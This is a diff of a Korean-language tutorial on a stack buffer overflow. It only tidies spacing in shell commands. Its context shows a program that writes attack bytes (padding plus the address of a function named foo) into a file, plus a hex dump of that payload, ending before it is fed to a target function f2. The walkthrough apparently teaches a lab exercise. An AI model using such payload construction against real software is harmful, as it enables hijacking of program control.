@@ -568,10 +568,10 @@ char buf[200];
 `./`로 `inp-write` 파일을 실행하면, `return address`에 `foo` 함수의 주소값이 저장되고, 그 주소값에 지정된 명령을 수행하게 된다.
 
 ```bash
-$ gcc  -o  inp-write  inp-write.c
+$ gcc -o inp-write inp-write.c
 $ ./inp-write > attack-inp
 $ # Check if attack-inp has the right attack bytes:
-$ xxd  attack-inp
+$ xxd attack-inp
 0000000: 6162 6364 6561 6263 6465 6162 6364 6561  abcdeabcdeabcdea
 0000010: 629c 8404 08                             b....
 $ # And use this to attack f2:
